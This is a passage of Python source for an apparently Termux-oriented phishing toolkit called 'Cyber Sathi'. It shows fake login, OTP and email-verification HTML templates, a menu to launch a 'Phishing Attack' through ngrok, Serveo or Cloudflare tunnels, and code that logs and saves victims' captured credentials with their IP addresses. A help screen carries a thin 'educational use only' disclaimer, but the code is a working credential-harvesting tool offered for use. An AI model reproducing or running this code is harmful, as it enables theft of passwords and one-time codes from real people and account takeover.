        print(f"{Colors.YELLOW}[{i}] {entry['timestamp']}{Colors.RESET}")
        print(f"   IP: {entry['ip']}")
        print(f"   Template: {entry['template']}")
        print(f"   Credentials: {entry['credentials']}")
        print()
    
    # Save summary
    summary_file = os.path.join(DATA_DIR, f'summary_{int(time.time())}.txt')
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write(f"Cyber Sathi - Data Summary\n")
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"Total: {len(collected_data)}\n")
        f.write("="*50 + "\n\n")
        
        for entry in collected_data:
            f.write(f"Time: {entry['timestamp']}\n")
            f.write(f"IP: {entry['ip']}\n")
            f.write(f"Template: {entry['template']}\n")
            f.write(f"Credentials: {entry['credentials']}\n")
            f.write("-"*30 + "\n")
    
    print(f"{Colors.GREEN}[✓] Summary saved: {summary_file}{Colors.RESET}")

def create_new_template():
    """Create new template"""
    print(f"\n{Colors.CYAN}[+] CREATE NEW TEMPLATE{Colors.RESET}")
    
    template_name = input(f"{Colors.YELLOW}[?] Template name: {Colors.RESET}").strip()
    if not template_name:
        print(f"{Colors.RED}[✗] Name required{Colors.RESET}")
        return
    
    print(f"\n{Colors.WHITE}Template type:{Colors.RESET}")
    print(f"{Colors.GREEN}[1] Login page")
    print(f"{Colors.GREEN}[2] OTP page")
    print(f"{Colors.GREEN}[3] Email verification")
    print(f"{Colors.GREEN}[4] Custom HTML{Colors.RESET}")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select (1-4): {Colors.RESET}")
    
    if choice == '1':
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: Arial; background: #f5f5f5; margin: 0; padding: 20px; }
        .login-box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: 50px auto; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Login</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>'''
    
    elif choice == '2':
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>OTP Verification</title>
    <style>
        body { font-family: Arial; background: #f7f9fc; padding: 20px; }
        .otp-box { background: white; padding: 30px; border-radius: 15px; max-width: 400px; margin: 50px auto; text-align: center; }
        .otp-inputs { display: flex; justify-content: space-between; margin: 30px 0; }
        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #e6ebf1; border-radius: 8px; }
        button { width: 100%; padding: 15px; background: #4a6cf7; color: white; border: none; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="otp-box">
        <h2>Enter OTP</h2>
        <form method="POST">
            <div class="otp-inputs">
                <input type="text" name="digit1" class="otp-input" maxlength="1" required>
                <input type="text" name="digit2" class="otp-input" maxlength="1" required>
                <input type="text" name="digit3" class="otp-input" maxlength="1" required>
                <input type="text" name="digit4" class="otp-input" maxlength="1" required>
                <input type="text" name="digit5" class="otp-input" maxlength="1" required>
                <input type="text" name="digit6" class="otp-input" maxlength="1" required>
            </div>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>'''
    
    elif choice == '3':
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Verify Email</title>
    <style>
        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; }
        .verify-box { background: white; padding: 30px; border-radius: 15px; max-width: 400px; margin: 50px auto; }
        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #e0e0e0; border-radius: 8px; }
        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="verify-box">
        <h2>Verify Email</h2>
        <form method="POST">
            <input type="email" name="email" placeholder="Enter your email" required>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>'''
    
    else:
        print(f"\n{Colors.YELLOW}[*] Enter HTML (type 'END' on new line):{Colors.RESET}")
        lines = []
        while True:
            line = input()
            if line.strip() == 'END':
                break
            lines.append(line)
        html = '\n'.join(lines)
    
    # Save template
    filename = f"{template_name.lower().replace(' ', '_')}.html"
    filepath = os.path.join(TEMPLATES_DIR, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html)
    
    print(f"{Colors.GREEN}[✓] Template saved: {filename}{Colors.RESET}")

def view_templates():
    """View templates"""
    templates = load_templates()
    
    print(f"\n{Colors.CYAN}[+] AVAILABLE TEMPLATES{Colors.RESET}")
    print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
    
    for i, (name, content) in enumerate(templates.items(), 1):
        size_kb = len(content) / 1024
        print(f"{Colors.GREEN}[{i}] {name} ({size_kb:.1f} KB){Colors.RESET}")
    
    print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")

def start_attack():
    """Start attack"""
    templates = load_templates()
    
    if not templates:
        print(f"{Colors.RED}[✗] No templates found{Colors.RESET}")
        return
    
    view_templates()
    
    try:
        choice = int(input(f"\n{Colors.YELLOW}[?] Select template (1-{len(templates)}): {Colors.RESET}"))
        template_list = list(templates.keys())
        
        if 1 <= choice <= len(template_list):
            selected = template_list[choice-1]
            
            port_input = input(f"{Colors.YELLOW}[?] Port (8080): {Colors.RESET}")
            port = int(port_input) if port_input.isdigit() else 8080
            
            domain_config = domain_options_menu()
            
            start_phishing_server(selected, port, domain_config)
        else:
            print(f"{Colors.RED}[✗] Invalid selection{Colors.RESET}")
    except ValueError:
        print(f"{Colors.RED}[✗] Enter number{Colors.RESET}")

def clear_data():
    """Clear all data"""
    global collected_data
    
    print(f"\n{Colors.RED}[!] CLEAR ALL DATA{Colors.RESET}")
    print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
    print(f"{Colors.RED}This will delete ALL captured data!{Colors.RESET}")
    
    confirm = input(f"\n{Colors.YELLOW}[?] Type 'DELETE' to confirm: {Colors.RESET}")
    
    if confirm == 'DELETE':
        collected_data = []
        
        # Delete all data files
        for file in os.listdir(DATA_DIR):
            if file.endswith('.json') or file.endswith('.txt'):
                os.remove(os.path.join(DATA_DIR, file))
        
        # Delete tunnel files
        for file in os.listdir(NGROK_DIR):
            os.remove(os.path.join(NGROK_DIR, file))
        
        print(f"{Colors.GREEN}[✓] All data cleared!{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}[*] Cancelled{Colors.RESET}")

def show_help():
    """Show help"""
    print_banner()
    
    help_text = f"""
{Colors.CYAN}[✓] CYBER SATHI HELP{Colors.RESET}
{Colors.WHITE}{'═'*55}{Colors.RESET}

{Colors.YELLOW}📱 MOBILE USERS (Termux):{Colors.RESET}
{Colors.RED}• Keep HOTSPOT ON for ngrok to work{Colors.RESET}
{Colors.RED}• Or use mobile data{Colors.RESET}
{Colors.RED}• Termux may block tunnels on WiFi{Colors.RESET}

{Colors.YELLOW}🔑 NGROK AUTH TOKEN:{Colors.RESET}
1. Get token: https://dashboard.ngrok.com/auth
2. Select 'Setup Ngrok Token' from menu
3. Enter your token
4. Token auto-saves for future use

{Colors.YELLOW}🌐 DOMAIN OPTIONS:{Colors.RESET}
[1] Ngrok Free - Shows 'Visit Site' page
[2] Ngrok Pro - Custom subdomain (paid)
[3] Serveo.net - Recommended free option
[4] Local - Only your network
[5] Cloudflare - Professional & free
[6] Custom Domain - Your own domain

{Colors.YELLOW}📁 TEMPLATES:{Colors.RESET}
• Stored in: {TEMPLATES_DIR}/
• Create custom templates
• Edit HTML files directly

{Colors.YELLOW}💾 DATA:{Colors.RESET}
• Saved in: {DATA_DIR}/
• Auto-saves all captures
• View from main menu

{Colors.RED}⚠  LEGAL:{Colors.RESET}
• Educational use ONLY
• Test only on OWN systems
• Unauthorized access is ILLEGAL

{Colors.GREEN}🔧 REQUIREMENTS:{Colors.RESET}
• Python 3.x
• Internet connection
• Mobile: Termux + Hotspot
"""
    print(help_text)
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

def main_menu():
    """Main menu"""
    setup_directories()
    load_config()
    
    while True:
        print_banner()
        
        print(f"\n{Colors.CYAN}[+] MAIN MENU{Colors.RESET}")
        print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
        print(f"{Colors.GREEN}[1] Start Phishing Attack")
        print(f"{Colors.GREEN}[2] View Templates")
        print(f"{Colors.GREEN}[3] Create Template")
        print(f"{Colors.GREEN}[4] View Captured Data")
        print(f"{Colors.GREEN}[5] Setup Ngrok Token")
        print(f"{Colors.GREEN}[6] Install Ngrok (Termux)")
        print(f"{Colors.GREEN}[7] Clear All Data")
        print(f"{Colors.GREEN}[8] Help & Guide")
        print(f"{Colors.RED}[0] Exit{Colors.RESET}")
        print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.RESET}")
        
        if choice == '1':
            start_attack()
        elif choice == '2':
            view_templates()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '3':
            create_new_template()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '4':
            show_captured_data()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '5':
            setup_ngrok_auth()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '6':
            install_ngrok_termux()
        elif choice == '7':
            clear_data()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '8':
            show_help()
        elif choice == '0':
            print(f"\n{Colors.RED}[✗] Exiting...{Colors.RESET}")
            break
        else:
            print(f"{Colors.RED}[✗] Invalid option{Colors.RESET}")
            time.sleep(1)

# Main execution
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[✗] Stopped by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[✗] Error: {e}{Colors.RESET}")
